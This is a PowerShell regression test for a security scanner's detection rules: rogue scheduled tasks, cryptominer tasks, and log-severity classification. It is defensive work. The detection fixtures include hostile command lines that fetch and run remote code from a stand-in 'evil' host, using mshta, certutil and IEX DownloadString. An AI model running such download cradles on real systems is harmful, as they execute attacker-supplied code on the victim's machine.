<#
.SYNOPSIS
    audit 2026-08-18 §5 — false-positive anchoring + log-severity colouring.
.DESCRIPTION
    Guards three fixes, all of which are about a BARE SUBSTRING matching text it was
    never meant to match:

      §5.1  Classify coloured a clean scan's own progress lines red, because the prose
            words CRITICAL / SUSPICIOUS / ANOMAL were matched against every log line
            including the engine's own "[HUNT] CHECKING FOR SUSPICIOUS ..." banners.
            The engine's bracket tag is now authoritative; prose is a fallback.
      §5.3  Phase 64's miner-task heuristic matched bare "coin" against a task's exe
            PATH — CRITICAL + a destructive RunCmd, i.e. auto-selected — so a healthy
            box with Coinbase installed got its task unregistered (user rule #1).
      §5.4  Phase 29's rogue-task heuristic matched bare "cmd" / "Temp" / "\.js"
            against exe+args — same auto-selected destructive grade.

    Every regex is pulled out of the shipped source via the AST, so this test cannot
    drift from the code it guards. Read-only: touches no registry, file or process.
#>
$ErrorActionPreference = 'Stop'
$root = Split-Path -Parent (Split-Path -Parent $PSScriptRoot)
$pass = 0; $fail = 0
function T { param([string]$Name, [bool]$Cond)
    if ($Cond) { $script:pass++ } else { $script:fail++; Write-Host "  FAIL  $Name" -ForegroundColor Red } }

# ── helper: pull the constant string out of a `-match` binary expression ────────
function Get-MatchRegex {
    param([string]$File, [string]$LeftVar, [string]$Contains)
    $e = $null
    $ast = [System.Management.Automation.Language.Parser]::ParseFile(
        (Join-Path $root $File), [ref]$null, [ref]$e)
    if ($e.Count) { throw "$File has parse errors" }
    $hits = $ast.FindAll({
        param($n)
        $n -is [System.Management.Automation.Language.BinaryExpressionAst] -and
        # -match parses as Imatch (case-insensitive is the default); accept all three
        "$($n.Operator)" -in @('Imatch','Cmatch','Match') -and
        $n.Right -is [System.Management.Automation.Language.StringConstantExpressionAst]
    }, $true) | Where-Object {
        $_.Left.Extent.Text -like "*$LeftVar*" -and $_.Right.Value -like "*$Contains*"
    }
    if ($hits.Count -ne 1) { throw "expected 1 '-match' for $LeftVar/$Contains in $File, found $($hits.Count)" }
    $hits[0].Right.Value
}

# ══ §5.4  Phase 29 rogue scheduled task (Phases-1.ps1) ═════════════════════════
$taskRx = Get-MatchRegex 'engine/Phases-1.ps1' '$taskCmd' 'EncodedCommand'

$taskTP = @(
    'cmd.exe /c rem Scythe_TEST_DELETEME benign no-op'   # CLAUDE.md tripwire — MUST keep firing
    'C:\Windows\System32\cmd.exe /c evil.bat'
    'wscript.exe C:\Users\bob\AppData\Local\Temp\a.vbs'
    'powershell.exe -nop -w hidden -enc SQBFAFgA'
    'C:\Users\bob\AppData\Roaming\svc.exe'
    '%TEMP%\dropper.js'
    'C:/Users/bob/AppData/Local/Temp/fwd.exe'                # forward slashes too
    'mshta.exe http://evil/x.hta'
    'rundll32.exe C:\ProgramData\x.dll,Start'
    'certutil -urlcache -f http://evil/a.exe a.exe'
    'powershell IEX (New-Object Net.WebClient).DownloadString(''http://evil'')'
    'C:\x\loader.jse'
)
$taskFP = @(
    'C:\Program Files\Vendor\vendorcmd.exe --sync'
    'C:\Program Files\Acme\bin\acme.exe --config C:\ProgramData\Acme\settings.json'
    'C:\Program Files\Foo\foo.exe -Template default'
    'C:\Program Files\Bar\bar.exe /attempt 3'
    'C:\Program Files\Baz\baz.exe --cmdlets all'
    'C:\Program Files\TempoSoft\tempo.exe /run'
    'C:\Program Files\App\app.exe --output C:\Reports\daily.jsx'
    'C:\Program Files\Contoso\sync.exe --temporary-dir D:\work'
)
foreach ($v in $taskTP) { T "P29 detects: $v"      ($v -match $taskRx) }
foreach ($v in $taskFP) { T "P29 clean: $v"   (-not ($v -match $taskRx)) }
# the anchors themselves — a future edit that drops them fails here, not on a client box
T 'P29 cmd is word-anchored'      ($taskRx -match '\\bcmd\\b')
T 'P29 AppData is path-anchored'  ($taskRx -match '\[\\\\/%\]AppData')
T 'P29 Temp is path-anchored'     ($taskRx -match '\[\\\\/%\]Temp')
T 'P29 .js does not eat .json'    (-not ('x --config a.json' -match $taskRx))

# ══ §5.3  Phase 64 miner scheduled task (Phases-2.ps1) ═════════════════════════
$minerRx = Get-MatchRegex 'engine/Phases-2.ps1' '$exe' 'hashrate'

$minerTP = @(
    'C:\Users\bob\AppData\Local\xmrig.exe'
    'C:\ProgramData\coinminer.exe'
    'C:\x\coin-miner.exe'
    'C:\x\CoinHive.exe'
    'C:\mining\svc.exe'
    'C:\x\hashrate.exe'
    'C:\x\stratum-proxy.exe'
    'C:\x\pool.exe'
)
$minerFP = @(
    'C:\Program Files\Coinbase\Coinbase.exe'
    'C:\Program Files (x86)\Coinstar\updater.exe'
    'C:\Games\liverpool.exe'
    'C:\Program Files\Bitcoin\bitcoin-qt.exe'
    'C:\Program Files\CoinTracker\tracker.exe'
)
foreach ($v in $minerTP) { T "P64 detects: $v"     ($v -match $minerRx) }
foreach ($v in $minerFP) { T "P64 clean: $v"  (-not ($v -match $minerRx)) }
T 'P64 no bare coin'  (-not ('C:\Program Files\Coinbase\x.exe' -match $minerRx))
T 'P64 pool anchored' ($minerRx -match '\\bpool')

# ══ §5.1  Classify severity — tag beats prose ══════════════════════════════════
# Classify lives inside the $script:SCAN_SCRIPT here-string, which ParseFile on the
# outer file never validates. Extract the here-string, then lift out the two tables
# and the function by AST and load them here.
$serverSrc = Get-Content (Join-Path $root 'Scythe-Server.ps1') -Raw
$e = $null
$sAst = [System.Management.Automation.Language.Parser]::ParseInput($serverSrc, [ref]$null, [ref]$e)
$scanAssign = $sAst.FindAll({
    param($n) $n -is [System.Management.Automation.Language.AssignmentStatementAst] -and
              $n.Left.Extent.Text -eq '$script:SCAN_SCRIPT'
}, $true)
if ($scanAssign.Count -ne 1) { throw "expected 1 \$script:SCAN_SCRIPT assignment, found $($scanAssign.Count)" }
$hs = $scanAssign[0].Right.Extent.Text
$hs = $hs.Substring(2); $hs = $hs.Substring(0, $hs.LastIndexOf("'@"))

$iAst = [System.Management.Automation.Language.Parser]::ParseInput($hs, [ref]$null, [ref]$e)
if ($e.Count) { throw 'SCAN_SCRIPT here-string does not parse' }
$want = 'SEV_TAG','SEV_RX','TKW'
$chunks = @()
foreach ($w in $want) {
    $a = $iAst.FindAll({
        param($n) $n -is [System.Management.Automation.Language.AssignmentStatementAst]
    }, $true) | Where-Object { $_.Left.Extent.Text -eq "`$$w" }
    if ($a.Count -ne 1) { throw "expected 1 assignment for `$$w in SCAN_SCRIPT, found $($a.Count)" }
    $chunks += $a[0].Extent.Text
}
$fn = $iAst.FindAll({
    param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $n.Name -eq 'Classify'
}, $true)
if ($fn.Count -ne 1) { throw "expected 1 Classify function, found $($fn.Count)" }
$chunks += $fn[0].Extent.Text
. ([scriptblock]::Create($chunks -join "`n"))

# the engine's own prose, tagged — these are what used to go red on a clean scan
T 'HUNT banner mentioning SUSPICIOUS stays HUNT' ((Classify '[HUNT] CHECKING FOR SUSPICIOUS DRIVERS...').sev -eq 'HUNT')
T 'HUNT banner mentioning CRITICAL stays HUNT'   ((Classify '[HUNT] AUDITING CRITICAL SYSTEM PATHS').sev  -eq 'HUNT')
T 'OK line saying NO ANOMALOUS is CLEAN'         ((Classify '  -> [OK ] NO ANOMALOUS SERVICES.').sev       -eq 'CLEAN')
T 'OK line (unpadded) is CLEAN'                  ((Classify '  -> [OK] NO CRYPTOMINER INDICATORS.').sev    -eq 'CLEAN')
T 'INFO line naming a possible threat is INFO'   ((Classify '[INFO] EVALUATING POSSIBLE PERSISTENCE').sev  -eq 'INFO')
# real severities still land
T '[CRIT] is CRITICAL'  ((Classify '[CRIT] Rogue service: evil.exe').sev -eq 'CRITICAL')
T '[WARN] is HIGH'      ((Classify '[WARN] unsigned binary in Temp').sev -eq 'HIGH')
T '[!!] is CRITICAL'    ((Classify '[!!] THREAT BANNER').sev             -eq 'CRITICAL')
T '[VER] is INFO'       ((Classify '[VER] task audit complete').sev      -eq 'INFO')
# untagged prose still falls back
T 'untagged IOC HIT -> CRITICAL' ((Classify 'IOC HIT: 8.8.8.8 seen in DNS cache').sev -eq 'CRITICAL')
T 'untagged SCANNING -> HUNT'    ((Classify 'SCANNING REGISTRY RUN KEYS').sev         -eq 'HUNT')
T 'unmatched line -> INFO'       ((Classify 'Scythe V23 Kraken Console').sev      -eq 'INFO')
# the two tables must stay separated — tags out of the prose table, prose out of tags
T 'prose table carries no bracket tags' (-not ($SEV_RX.Values.ToString -and ($SEV_RX.Keys | Where-Object { $SEV_RX[$_].ToString() -match '\\\[' })))
T 'tag table carries no bare prose'     (-not ($SEV_TAG.Keys | Where-Object { $SEV_TAG[$_].ToString() -match 'SUSPICIOUS|ANOMAL|BLATANT|SCANNING' }))
# threat bucketing is unchanged (fallback path only — see CLAUDE.md)
T 'TKW still buckets ransomware' ((Classify 'ransom note dropped').tt -eq 'Ransomware')

Write-Host ("`n{0} passed, {1} failed" -f $pass, $fail) -ForegroundColor $(if($fail){'Red'}else{'Green'})
if ($fail) { exit 1 }
